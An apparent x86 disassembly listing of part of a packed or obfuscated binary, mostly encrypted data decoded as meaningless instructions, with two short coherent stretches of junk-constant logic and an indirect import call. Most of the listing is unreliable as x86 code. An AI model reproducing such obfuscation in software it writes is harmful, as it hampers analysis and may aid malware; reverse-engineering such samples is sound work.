  40f1a5:	mov    ds:0xd0db8655,eax
  40f1aa:	mov    ecx,0xf7eb33f2
  40f1af:	inc    edi
  40f1b0:	jle    0x40f224
  40f1b2:	xchg   edx,eax
  40f1b3:	scas   eax,DWORD PTR es:[edi]
  40f1b4:	adc    al,0x11
  40f1b6:	push   eax
  40f1b7:	cdq    
  40f1b8:	pop    esp
  40f1b9:	scas   eax,DWORD PTR es:[edi]
  40f1ba:	idiv   DWORD PTR [ebx-0x53]
  40f1bd:	fcomp  QWORD PTR [edi]
  40f1bf:	push   ebx
  40f1c0:	xchg   esi,eax
  40f1c1:	add    bl,0x82
  40f1c4:	add    edi,esp
  40f1c6:	call   0x4948fad1
  40f1cb:	cmp    BYTE PTR [ecx+edi*4],dl
  40f1ce:	ret    
  40f1cf:	mov    ecx,0xcd94583
  40f1d4:	clc    
  40f1d5:	xchg   ecx,eax
  40f1d6:	xor    eax,0x6e2a2c0c
  40f1db:	pop    ebx
  40f1dc:	pop    ebx
  40f1dd:	cdq    
  40f1de:	mov    ebx,0xff420c64
  40f1e3:	loop   0x40f1ee
  40f1e5:	test   al,0x2b
  40f1e7:	jmp    0x4c67:0x749a32de
  40f1ee:	inc    ebp
  40f1ef:	lahf   
  40f1f0:	out    dx,al
  40f1f1:	jmp    DWORD PTR [edi+0x53eedf96]
  40f1f7:	popa   
  40f1f8:	and    ecx,DWORD PTR [ecx+0x52]
  40f1fb:	cmc    
  40f1fc:	inc    esi
  40f1fd:	mov    ebx,0x8566ef1a
  40f202:	fcmovnb st,st(1)
  40f204:	xchg   edx,eax
  40f205:	rcl    BYTE PTR [ebp-0x23],0xd8
  40f209:	or     ah,BYTE PTR [ebp+0x6d]
  40f20c:	fcmovbe st,st(7)
  40f20e:	add    DWORD PTR [ecx-0x72f2d22],edi
  40f214:	mov    cl,0xff
  40f216:	cmp    DWORD PTR [edx+0x3fb33165],esp
  40f21c:	xor    al,0x1c
  40f21e:	call   0xecf2de63
  40f223:	stos   BYTE PTR es:[edi],al
  40f224:	fldcw  WORD PTR [esi]
  40f226:	sti    
  40f227:	repnz stc 
  40f229:	gs mov cl,0x70
  40f22c:	fld    TBYTE PTR [ebx]
  40f22e:	adc    DWORD PTR [esi-0x1f67d48],eax
  40f234:	test   DWORD PTR [ebx+ecx*8+0x10f3954c],esi
  40f23b:	add    BYTE PTR [edi+0x5a],0xb9
  40f23f:	add    DWORD PTR [ebp-0x54],0x4759c8a0
  40f246:	je     0x40f228
  40f248:	mov    dh,0x4
  40f24a:	stc    
  40f24b:	jae    0x40f2b4
  40f24d:	push   ebx
  40f24e:	je     0x40f1fd
  40f250:	pop    ss
  40f251:	aad    0x1c
  40f253:	into   
  40f254:	in     al,0x9
  40f256:	mov    ?,WORD PTR [edx]
  40f258:	and    al,0x6c
  40f25a:	arpl   WORD PTR [esp+ebp*8],di
  40f25d:	jns    0xb77d2b7d
  40f263:	xchg   cl,ch
  40f265:	fcmovb st,st(1)
  40f267:	inc    edi
  40f268:	mov    ah,0x3f
  40f26a:	mov    al,ds:0xd078161b
  40f26f:	fwait
  40f270:	adc    BYTE PTR [ecx+0x4b],dh
  40f273:	das    
  40f274:	sub    ecx,DWORD PTR [eax+0x70]
  40f277:	push   ss
  40f278:	out    dx,eax
  40f279:	xchg   edi,eax
  40f27a:	jnp    0x40f280
  40f27c:	sub    DWORD PTR [esi+0x7f],edi
  40f27f:	int    0xd7
  40f281:	inc    edi
  40f282:	pop    edx
  40f283:	cmp    al,0x73
  40f285:	add    eax,0x37eb730c
  40f28a:	xchg   edx,eax
  40f28b:	sbb    BYTE PTR [esi+0x9],dl
  40f28e:	nop
  40f28f:	adc    BYTE PTR [edx-0x49],ah
  40f292:	fild   DWORD PTR [ebx+0xfdc64d]
  40f298:	cmc    
  40f299:	dec    esi
  40f29a:	xor    eax,0x2d84bea4
  40f29f:	inc    esp
  40f2a0:	cmp    DWORD PTR [esi],esi
  40f2a2:	xor    al,BYTE PTR [ebp+0x14]
  40f2a5:	(bad)  
  40f2a6:	push   ebp
  40f2a7:	(bad)  [ecx]
  40f2a9:	jp     0x40f28d
  40f2ab:	lahf   
  40f2ac:	fadd   DWORD PTR fs:[ebx+0x56e81d5a]
  40f2b3:	fcom   QWORD PTR [esi-0x7638bb29]
  40f2b9:	(bad)  
  40f2ba:	test   eax,0x933bc591
  40f2bf:	int    0xc2
  40f2c1:	add    ecx,DWORD PTR [ebx+ebx*1+0xbf2392a]
  40f2c8:	inc    eax
  40f2c9:	xchg   edx,eax
  40f2ca:	(bad)  
  40f2cb:	mov    bh,0x95
  40f2cd:	in     al,dx
  40f2ce:	lock idiv DWORD PTR [esi]
  40f2d1:	test   DWORD PTR [edi+ecx*1-0x5c],esi
  40f2d5:	push   es
  40f2d6:	shr    BYTE PTR [ebp+0x5c468d13],0xdb
  40f2dd:	jmp    0xc98:0x11ff50db
  40f2e4:	lahf   
  40f2e5:	aam    0x33
  40f2e7:	std    
  40f2e8:	jns    0x40f289
  40f2ea:	cmp    eax,0x2098d0d5
  40f2ef:	cld    
  40f2f0:	fnstcw WORD PTR [edx-0x71]
  40f2f3:	xlat   BYTE PTR ds:[ebx]
  40f2f4:	in     eax,0x81
  40f2f6:	cld    
  40f2f7:	(bad)  
  40f2f8:	frstor [edx-0x30c3951c]
  40f2fe:	cmp    DWORD PTR ds:0xccf6462d,esp
  40f304:	loope  0x40f35a
  40f306:	test   esp,ebp
  40f308:	pushf  
  40f309:	hlt    
  40f30a:	icebp  
  40f30b:	mov    ch,BYTE PTR [ebp-0x6eb637a2]
  40f311:	int    0x2e
  40f313:	mov    WORD PTR [eax+0x5aae43ed],cs
  40f319:	lods   eax,DWORD PTR ds:[esi]
  40f31a:	ins    BYTE PTR es:[edi],dx
  40f31b:	jnp    0x40f38b
  40f31d:	fnstsw WORD PTR [eax-0x15]
  40f320:	sbb    ebp,ebp
  40f322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f323:	cmp    al,0x22
  40f325:	dec    esp
  40f326:	daa    
  40f327:	inc    ebx
  40f328:	mov    dl,0xb
  40f32a:	cmp    BYTE PTR [eax],0x22
  40f32d:	or     bl,ah
  40f32f:	add    al,ch
  40f331:	int3   
  40f332:	stc    
  40f333:	mov    edx,0x25c16f18
  40f338:	jo     0x40f2c3
  40f33a:	jp     0x40f2c5
  40f33c:	and    al,0xf1
  40f33e:	ret    0x9db0
  40f341:	inc    edx
  40f342:	pop    esi
  40f343:	jae    0x40f381
  40f345:	call   0x5e05:0xd02444b3
  40f34c:	cwde   
  40f34d:	daa    
  40f34e:	adc    eax,0x8efe634b
  40f353:	jmp    0xb7e593c6
  40f358:	dec    BYTE PTR [ebx-0x16]
  40f35b:	loopne 0x40f307
  40f35d:	fild   WORD PTR [ebp+ecx*2-0x48]
  40f361:	es push ebp
  40f363:	add    esi,DWORD PTR [edx-0x2b]
  40f366:	enter  0xa7c6,0x29
  40f36a:	imul   ecx,edx,0xffffff8c
  40f36d:	rcr    DWORD PTR [edi+0x4e719fe3],0xce
  40f374:	popa   
  40f375:	out    dx,eax
  40f376:	fnstcw WORD PTR [ecx-0x6c]
  40f379:	mov    dh,BYTE PTR cs:[eax-0x7e]
  40f37d:	adc    al,0x6f
  40f37f:	mov    WORD PTR [edx+0x73ad2b18],ds
  40f385:	lea    edi,ds:[ecx+0x1]
  40f389:	pop    eax
  40f38a:	jnp    0x40f355
  40f38c:	or     cl,bl
  40f38e:	clc    
  40f38f:	jnp    0x40f35f
  40f391:	ins    DWORD PTR es:[edi],dx
  40f392:	cwde   
  40f393:	loopne 0x40f324
  40f395:	adc    DWORD PTR [ebx-0x5ce729a],ebp
  40f39b:	bound  edi,QWORD PTR [ebx-0x6eb6d5af]
  40f3a1:	sub    esi,DWORD PTR [ebx]
  40f3a3:	and    ch,BYTE PTR [eax+ebx*4+0x27971f53]
  40f3aa:	xchg   ecx,eax
  40f3ab:	xchg   edi,eax
  40f3ac:	int    0xf3
  40f3ae:	sub    ch,cl
  40f3b0:	das    
  40f3b1:	dec    edi
  40f3b2:	mov    ah,0x88
  40f3b4:	push   0xffffffa2
  40f3b6:	and    edi,edi
  40f3b8:	les    esi,FWORD PTR ds:0x4629ec80
  40f3be:	jb     0x40f3ff
  40f3c0:	(bad)  
  40f3c1:	xchg   ecx,eax
  40f3c2:	int3   
  40f3c3:	jmp    0x40f394
  40f3c5:	jae    0x40f356
  40f3c7:	rcl    DWORD PTR [edi-0x6b],cl
  40f3ca:	and    eax,0xd68e3eb0
  40f3cf:	and    esi,ebp
  40f3d1:	gs mov ch,0xf5
  40f3d4:	mov    ds:0x3996c8fe,eax
  40f3d9:	or     al,0x7e
  40f3db:	or     BYTE PTR [eax+0x65b7cf9],dh
  40f3e1:	repz leave 
  40f3e3:	(bad)  
  40f3e4:	stc    
  40f3e5:	sbb    eax,0x2d76a3aa
  40f3ea:	(bad)  
  40f3eb:	ds mov bl,0x8c
  40f3ee:	call   0x2f70:0x1453cf61
  40f3f5:	xor    DWORD PTR [ecx],esp
  40f3f7:	push   0xdb9e4090
  40f3fc:	jnp    0x40f3a0
  40f3fe:	jne    0x40f474
  40f400:	jg     0x40f3ce
  40f402:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40f404:	mov    al,0x30
  40f406:	nop
  40f407:	fdiv   QWORD PTR [ecx-0x44]
  40f40a:	pop    ecx
  40f40b:	jae    0x40f3b6
  40f40d:	inc    edx
  40f40e:	ds push esi
  40f410:	or     ebx,DWORD PTR [edi+ebp*4]
  40f413:	fisubr DWORD PTR [edi-0x7332477e]
  40f419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f41a:	lahf   
  40f41b:	jns    0x40f428
  40f41d:	jecxz  0x40f3cb
  40f41f:	lods   al,BYTE PTR ds:[esi]
  40f420:	push   ebx
  40f421:	mov    ch,0xa7
  40f423:	daa    
  40f424:	push   ss
  40f425:	icebp  
  40f426:	pusha  
  40f427:	in     al,0x49
  40f429:	dec    esp
  40f42a:	str    ebx
  40f42d:	mov    eax,0x35627f28
  40f432:	stos   DWORD PTR es:[edi],eax
  40f433:	sti    
  40f434:	retf   0x4abb
  40f437:	aas    
  40f438:	clc    
  40f439:	jle    0x40f475
  40f43b:	xchg   edi,eax
  40f43c:	adc    al,0xaf
  40f43e:	dec    ebp
  40f43f:	add    BYTE PTR [eax],0x97
  40f442:	cmp    edi,DWORD PTR [esi-0x7cec1b65]
  40f448:	jge    0x40f3f8
  40f44a:	jecxz  0x40f45c
  40f44c:	daa    
  40f44d:	mov    cl,0x71
  40f44f:	mov    eax,0x3009cc49
  40f454:	lds    esi,FWORD PTR [ebp+0x38]
  40f457:	or     BYTE PTR [ebx+0x2340eca1],al
  40f45d:	sub    BYTE PTR [eax-0x3d],bh
  40f460:	xchg   esp,eax
  40f461:	mov    eax,DWORD PTR [eax+esi*8]
  40f464:	ja     0x40f3ff
  40f466:	push   es
  40f467:	sbb    al,0x3b
  40f469:	mov    fs,WORD PTR [ecx+edi*4-0x2c154807]
  40f470:	aad    0x87
  40f472:	sbb    BYTE PTR [edi],ah
  40f474:	jecxz  0x40f40b
  40f476:	ds in  al,dx
  40f478:	(bad)  
  40f479:	cmp    al,0x24
  40f47b:	dec    ebp
  40f47c:	jnp    0x40f444
  40f47e:	cmp    ecx,DWORD PTR [ecx+0x7e480b55]
  40f484:	inc    ecx
  40f485:	xchg   ebp,eax
  40f486:	scas   al,BYTE PTR es:[edi]
  40f487:	imul   ecx,DWORD PTR [ecx+ebx*2+0x28363aa9],0x5ea1b635
  40f492:	scas   al,BYTE PTR es:[edi]
  40f493:	mov    eax,ds:0xc4e318d0
  40f498:	jnp    0x40f453
  40f49a:	ins    DWORD PTR es:[edi],dx
  40f49b:	add    eax,0xd4a868c2
  40f4a0:	in     eax,0x7a
  40f4a2:	xchg   edi,eax
  40f4a3:	sub    esi,DWORD PTR [ebx+0x5]
  40f4a6:	sbb    eax,0x79746afa
  40f4ab:	iret   
  40f4ac:	inc    esi
  40f4ad:	jbe    0x40f4c7
  40f4af:	repnz fdivr QWORD PTR [edi+0x35eccfa2]
  40f4b6:	push   ds
  40f4b7:	inc    esp
  40f4b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4b9:	scas   al,BYTE PTR es:[edi]
  40f4ba:	jmp    0x40f509
  40f4bc:	adc    al,0x3c
  40f4be:	jns    0x40f517
  40f4c0:	add    al,0x4
  40f4c2:	inc    ecx
  40f4c3:	mov    ebx,0xc75f916c
  40f4c8:	nop
  40f4c9:	or     al,BYTE PTR [edi+ecx*1-0x4c]
  40f4cd:	mov    esp,0x4b28d0c
  40f4d2:	add    eax,0x99d6590d
  40f4d7:	adc    eax,0xc4b52118
  40f4dc:	imul   ebx,edx,0xffffffa8
  40f4df:	inc    edx
  40f4e0:	ins    DWORD PTR es:[edi],dx
  40f4e1:	fild   WORD PTR [ebx+0x5ebc56d4]
  40f4e7:	cdq    
  40f4e8:	xchg   bl,ah
  40f4ea:	pop    es
  40f4eb:	mov    ecx,0xb85151c1
  40f4f0:	cmp    DWORD PTR [ebp+0x45c7f89c],eax
  40f4f6:	cld    
  40f4f7:	test   DWORD PTR ss:[eax+edi*8+0x46fb05c7],ebx
  40f4ff:	inc    ebx
  40f500:	add    BYTE PTR [eax+0x56000036],ah
  40f506:	mov    ecx,DWORD PTR ds:0x43470b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x4346d3,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x4346ff,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x43463f,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43468b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi+0x60]
  40f561:	mov    ds:0xb19e9ad7,eax
  40f566:	jle    0x40f5e6
  40f568:	hlt    
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f59e
  40f56d:	out    0x2e,eax
  40f56f:	pop    esi
  40f570:	mov    ah,BYTE PTR [ebp-0x248a4954]
  40f576:	mov    ?,WORD PTR [ebx]
  40f578:	add    eax,DWORD PTR [ecx+0x6e]
  40f57b:	inc    esp
  40f57c:	xchg   esp,eax
  40f57d:	call   0xbc74:0x749cdab2
  40f584:	or     al,0x78
  40f586:	fst    QWORD PTR [esi]
  40f588:	mov    al,ds:0x1c289fa3
  40f58d:	ret    
  40f58e:	or     BYTE PTR [ecx+0x7f],dl
  40f591:	retf   
  40f592:	adc    BYTE PTR [eax+0x7c474ddf],cl
  40f598:	jmp    FWORD PTR [edi-0x7be1aab]
  40f59e:	gs sbb al,0x60
  40f5a1:	test   al,0x33
  40f5a3:	pop    esp
  40f5a4:	arpl   sp,di
  40f5a6:	cmp    al,0xb3
  40f5a8:	mov    DWORD PTR [ebx+edi*8-0x4c5a62e1],ecx
  40f5af:	fstp   DWORD PTR [esi-0x7fc523fe]
  40f5b5:	mov    dl,0x5
  40f5b7:	pop    ebx
  40f5b8:	rcr    DWORD PTR [ebp+0x15],1
  40f5bb:	fisubr DWORD PTR [ecx-0x5cb4102c]
  40f5c1:	or     eax,0xf2d766b7
  40f5c6:	and    BYTE PTR [ebp+0x6bfff5f6],al
  40f5cc:	std    
  40f5cd:	mov    DWORD PTR [eax+0x171654e0],ecx
  40f5d3:	rcr    BYTE PTR [ecx],cl
  40f5d5:	pop    ds
  40f5d6:	adc    dl,BYTE PTR [ebx+0x31]
  40f5d9:	push   esp
  40f5da:	dec    edx
  40f5db:	or     BYTE PTR [edi-0x2127c76c],bh
  40f5e1:	dec    esi
  40f5e2:	dec    esp
  40f5e3:	cmc    
  40f5e4:	mov    al,0xe
  40f5e6:	push   ss
  40f5e7:	pop    eax
  40f5e8:	inc    esp
  40f5e9:	outs   dx,BYTE PTR ds:[esi]
  40f5ea:	sar    bh,1
  40f5ec:	or     al,0xcb
  40f5ee:	add    esi,DWORD PTR [esi]
  40f5f0:	in     eax,0x6a
  40f5f2:	shr    bl,1
  40f5f4:	add    al,BYTE PTR [edi]
  40f5f6:	aas    
  40f5f7:	imul   edx,DWORD PTR [edi+0x672305d0],0xa27294e7
  40f601:	jbe    0x40f63d
  40f603:	shl    ch,0x7c
  40f606:	(bad)  
  40f607:	and    eax,0x9181b86d
  40f60c:	fwait
  40f60d:	mov    al,ds:0xa24c1282
  40f612:	sub    DWORD PTR [ecx-0x39],eax
  40f615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f616:	xor    al,0x97
  40f618:	cdq    
  40f619:	fbld   TBYTE PTR [eax]
  40f61b:	jnp    0x40f645
  40f61d:	add    dl,BYTE PTR [esi]
  40f61f:	sbb    cl,BYTE PTR [edx]
  40f621:	xor    al,0x43
  40f623:	mov    eax,0xa75e7d8
  40f628:	and    BYTE PTR [ebx],ch
  40f62a:	fdiv   QWORD PTR [eax]
  40f62c:	(bad)  
  40f62d:	icebp  
  40f62e:	mov    bh,BYTE PTR [edi+0x723e79de]
  40f634:	enter  0xb4f7,0xb9
  40f638:	add    DWORD PTR [ecx+0x31420aa8],0x4ca1c7fe
  40f642:	add    ch,bh
  40f644:	loope  0x40f613
  40f646:	add    dl,BYTE PTR [ecx]
  40f648:	fiadd  WORD PTR [esi+esi*1+0x4f]
  40f64c:	inc    eax
  40f64d:	call   0x17f3:0x5e501ac6
  40f654:	inc    esi
  40f655:	xor    bh,BYTE PTR [ebx-0x198fe89f]
  40f65b:	mov    eax,0x7a1bde75
  40f660:	scas   eax,DWORD PTR es:[edi]
  40f661:	jns    0x40f671
  40f663:	imul   edi,DWORD PTR [ecx],0xb4bb1104
  40f669:	mov    ecx,0xda2bca84
  40f66e:	retf   0xcd3d
  40f671:	xor    BYTE PTR [edx+0x40e51038],cl
  40f677:	xor    dh,ch
  40f679:	jle    0x40f645
  40f67b:	pop    ebx
  40f67c:	xchg   ebx,eax
  40f67d:	push   eax
  40f67e:	jbe    0x40f637
  40f680:	mov    al,ds:0xc79e9db1
  40f685:	test   DWORD PTR [ecx-0x17e2790c],esi
  40f68b:	jb     0x40f64f
  40f68d:	clc    
  40f68e:	push   es
  40f68f:	xchg   ecx,eax
  40f690:	mov    bl,0xf6
  40f692:	xchg   DWORD PTR [ebp+0x9d17670],eax
  40f698:	pop    es
  40f699:	mov    ds:0x29406d55,eax
  40f69e:	and    dh,cl
  40f6a0:	cmc    
  40f6a1:	call   0xcb9d:0x35fe63a
  40f6a8:	mov    bh,0xf4
  40f6aa:	(bad)  
  40f6ab:	or     al,0x23
  40f6ad:	aas    
  40f6ae:	inc    eax
  40f6af:	icebp  
  40f6b0:	add    dh,dl
  40f6b2:	pushaw 
  40f6b4:	mov    DWORD PTR [ecx+esi*4],ecx
  40f6b7:	cmp    eax,0xa3d3d6d3
  40f6bc:	(bad)  
  40f6bd:	or     BYTE PTR [eax-0x17f1b4fe],ah
  40f6c3:	mov    bh,0xc0
  40f6c5:	iret   
  40f6c6:	and    ecx,DWORD PTR [ecx+0x5a]
  40f6c9:	shl    BYTE PTR [edx-0xf312ce4],cl
  40f6cf:	mov    eax,0x5b18a3ba
  40f6d4:	jne    0x40f719
  40f6d6:	jb     0x40f670
  40f6d8:	cmp    BYTE PTR [edx-0x216220a],ah
  40f6de:	mov    ds:0x460aa6dd,eax
  40f6e3:	add    ebp,DWORD PTR [eax]
  40f6e5:	daa    
  40f6e6:	pushf  
  40f6e7:	loope  0x40f736
  40f6e9:	fisttp WORD PTR [ebx]
  40f6eb:	int3   
  40f6ec:	fmul   DWORD PTR [eax+0x634353bf]
  40f6f2:	das    
  40f6f3:	sub    dl,BYTE PTR [edi-0x585266ca]
  40f6f9:	push   ebx
  40f6fa:	xchg   DWORD PTR [edx+0x231b9987],edi
  40f700:	sbb    ebp,ebp
  40f702:	add    eax,ecx
  40f704:	shl    al,cl
  40f706:	xor    ch,BYTE PTR [eax]
  40f708:	data16 ss mov ch,0xc1
  40f70c:	push   ss
  40f70d:	mov    bl,0xdc
  40f70f:	xchg   ebx,eax
  40f710:	jp     0x40f69e
  40f712:	scas   al,BYTE PTR es:[edi]
  40f713:	mov    ecx,0x9aad351a
  40f718:	ds xchg esp,eax
  40f71a:	dec    edx
  40f71b:	jmp    0xacd15917
  40f720:	push   edi
  40f721:	out    dx,eax
  40f722:	jb     0x40f78c
  40f724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f725:	data16 ja 0x40f704
  40f728:	outs   dx,DWORD PTR ds:[esi]
  40f729:	jnp    0x40f704
  40f72b:	mov    cl,0x87
  40f72d:	dec    esp
  40f72e:	jb     0x40f6d0
  40f730:	sub    DWORD PTR [edx+edx*8],edi
  40f733:	popf   
  40f734:	test   BYTE PTR [esp+ecx*2],bh
  40f737:	push   ds
  40f738:	pop    ecx
  40f739:	lods   eax,DWORD PTR ds:[esi]
  40f73a:	and    eax,0x856d16f4
  40f73f:	cli    
  40f740:	adc    BYTE PTR ds:0x8a225d27,0x94
  40f747:	ins    BYTE PTR es:[edi],dx
  40f748:	mov    WORD PTR [edx],ss
  40f74a:	pop    edx
  40f74b:	mov    ecx,0x8e87cc47
  40f750:	or     eax,0x6836307a
  40f755:	pop    esp
  40f756:	or     ch,al
  40f758:	jnp    0x40f763
  40f75a:	xor    DWORD PTR [edx-0xd],ebx
  40f75d:	clc    
  40f75e:	into   
  40f75f:	or     al,0x82
  40f761:	push   edi
  40f762:	jp     0x40f7dd
  40f764:	imul   ebx
  40f766:	pop    ds
  40f767:	enter  0x58d7,0xdb
  40f76b:	shr    al,cl
  40f76d:	push   DWORD PTR ds:0x69596b46
  40f773:	add    ah,ah
  40f775:	jno    0x40f730
  40f777:	and    al,0x1d
  40f779:	je     0x40f736
  40f77b:	mov    al,ds:0xaed26a1e
  40f780:	call   0x56d3:0xcc4cd266
  40f787:	push   cs
  40f788:	jb     0x40f76c
  40f78a:	jg     0x40f739
  40f78c:	aaa    
  40f78d:	neg    DWORD PTR [ecx]
  40f78f:	out    dx,al
  40f790:	inc    eax
  40f791:	sub    eax,DWORD PTR [ecx+0x779d15c9]
  40f797:	scas   al,BYTE PTR es:[edi]
  40f798:	gs jne 0x40f782
  40f79b:	or     BYTE PTR [edi],0x56
  40f79e:	pop    ebp
  40f79f:	ret    
  40f7a0:	loopne 0x40f74b
  40f7a2:	xchg   DWORD PTR [ecx+0x398496fd],ecx
  40f7a8:	stos   DWORD PTR es:[edi],eax
  40f7a9:	and    al,0xa5
  40f7ab:	xlat   BYTE PTR ds:[ebx]
  40f7ac:	push   esi
  40f7ad:	mov    edx,0xa28c3134
  40f7b2:	iret   
  40f7b3:	bound  ecx,QWORD PTR [ecx]
  40f7b5:	jp     0x40f75f
  40f7b7:	mov    ds:0xc83dd58c,al
  40f7bc:	and    ebx,DWORD PTR [edx]
  40f7be:	and    DWORD PTR [ecx-0x55],edx
  40f7c1:	mov    bh,0x35
  40f7c3:	mov    dh,bl
  40f7c5:	fistp  WORD PTR [eax]
  40f7c7:	add    dh,BYTE PTR [ecx+0x288383eb]
  40f7cd:	sbb    al,0xf
  40f7cf:	or     eax,0x7210829c
  40f7d4:	ins    BYTE PTR es:[edi],dx
  40f7d5:	or     BYTE PTR [eax],0xa4
  40f7d8:	xor    dl,bl
  40f7da:	shl    DWORD PTR [eax+0x514b6f5e],0xfb
  40f7e1:	sbb    eax,DWORD PTR [eax]
  40f7e3:	jns    0x40f79e
  40f7e5:	pop    esp
  40f7e6:	leave  
  40f7e7:	nop
  40f7e8:	sbb    DWORD PTR [ebp+0x19],ebp
  40f7eb:	mov    ds:0x8fa09741,eax
  40f7f0:	and    BYTE PTR [edi+0x6d],ch
  40f7f3:	adc    eax,0x6dc8dfe0
  40f7f8:	in     al,dx
  40f7f9:	lods   eax,DWORD PTR ds:[esi]
  40f7fa:	imul   ecx,DWORD PTR [eax-0x72647cb0],0xddf19699
  40f804:	popf   
  40f805:	lds    edi,FWORD PTR [esi-0x53afeb37]
  40f80b:	clc    
  40f80c:	out    dx,al
  40f80d:	add    al,BYTE PTR [ecx-0x570a7115]
  40f813:	sub    BYTE PTR [ebp+0x7a],bl
  40f816:	push   0x4b
  40f818:	loopne 0x40f81f
  40f81a:	and    eax,edx
  40f81c:	jno    0x40f845
  40f81e:	push   esi
  40f81f:	int    0xc5
  40f821:	xchg   ecx,eax
  40f822:	pop    edi
  40f823:	dec    esi
  40f824:	(bad)  
  40f826:	push   edx
  40f827:	add    esp,DWORD PTR [ecx-0x15c52dd6]
  40f82d:	sbb    bl,BYTE PTR [esi-0x59]
  40f830:	mov    ds,ecx
  40f832:	cmp    ah,BYTE PTR [edi]
  40f834:	test   bh,al
  40f836:	(bad)  
  40f837:	jmp    0xdd4f:0xe4fad5c9
  40f83e:	jne    0x40f811
  40f840:	out    dx,al
  40f841:	or     al,0x8b
  40f843:	dec    ebx
  40f844:	repnz sub DWORD PTR [ebx+0x2],ecx
  40f848:	sti    
  40f849:	adc    WORD PTR [ebp-0x3b99e3fd],sp
  40f850:	std    
  40f851:	in     eax,dx
  40f852:	fs leave 
  40f854:	les    ebx,FWORD PTR [ebx+0x2e126214]
  40f85a:	dec    esp
  40f85b:	ret    0xf977
  40f85e:	jmp    0x83f4b802
  40f863:	pop    ecx
  40f864:	imul   DWORD PTR [edi+0x6675effb]
  40f86a:	das    
  40f86b:	mov    WORD PTR [ebx-0x8],?
  40f86e:	sub    bl,BYTE PTR [eax+0x5ed8a991]
  40f874:	fsubr  st,st(5)
  40f876:	lds    edi,FWORD PTR [ebx-0x59]
  40f879:	jmp    0x22a32d20
  40f87e:	clc    
  40f87f:	add    eax,0xabf0ce06
  40f884:	aam    0x58
  40f886:	leave  
  40f887:	xor    esp,0x44a796c9
  40f88d:	xchg   DWORD PTR [esi],edx
  40f88f:	add    al,0xd2
  40f891:	xchg   esp,eax
  40f892:	push   ebx
  40f893:	cmp    ebx,edx
  40f895:	dec    ecx
  40f896:	sub    al,0xe9
  40f898:	ret    0x98df
  40f89b:	sti    
  40f89c:	adc    eax,0x7ea177b7
  40f8a1:	pop    esp
  40f8a2:	add    BYTE PTR [edi-0x423793ec],cl
  40f8a8:	sub    BYTE PTR [ebp+0x49],dh
  40f8ab:	addr16 cdq 
  40f8ad:	adc    al,al
  40f8af:	cld    
  40f8b0:	je     0x40f910
  40f8b2:	inc    esp
  40f8b3:	cs jmp 0x68f13982
  40f8b9:	je     0x40f933
  40f8bb:	nop
  40f8bc:	xchg   edx,eax
  40f8bd:	sub    ah,0xeb
  40f8c0:	jge    0x40f921
  40f8c2:	mov    al,ds:0x6b93fad3
  40f8c7:	sar    DWORD PTR [eax+esi*2-0x7a],1
  40f8cb:	cmp    BYTE PTR [esi+0x54daac18],ah
  40f8d1:	ja     0x40f91e
  40f8d3:	les    edi,FWORD PTR [edx-0x59]
  40f8d6:	mov    edi,fs
  40f8d8:	scas   al,BYTE PTR es:[edi]
  40f8d9:	xchg   ebx,eax
  40f8da:	fbld   TBYTE PTR [ebx]
  40f8dc:	cmp    dl,BYTE PTR [ebx+0x3b]
  40f8df:	dec    edx
  40f8e0:	imul   esp,eax,0xffffff8b
  40f8e3:	inc    ebp
  40f8e4:	cld    
  40f8e5:	mov    ecx,DWORD PTR [ebp+0xc]
  40f8e8:	xor    DWORD PTR ds:0x43463f,0x4346cf
  40f8f2:	xor    eax,edi
  40f8f4:	add    eax,esi
  40f8f6:	mov    DWORD PTR ds:0x43468b,0x4bab
  40f900:	cmp    eax,ecx
  40f902:	mov    DWORD PTR ds:0x43470f,0x3e53
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434693,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x4345eb
  40f921:	xor    DWORD PTR ds:0x434653,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x4346bf,0x0
  40f933:	mov    edx,DWORD PTR ds:0x4346bf
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x4346bf,edx
  40f940:	cmp    DWORD PTR ds:0x4346bf,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x43464b
  40f952:	push   0x434792
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x4346bf,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x4346bf
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x4346bf,edx
  40f986:	cmp    DWORD PTR ds:0x4346bf,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x4346bf,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
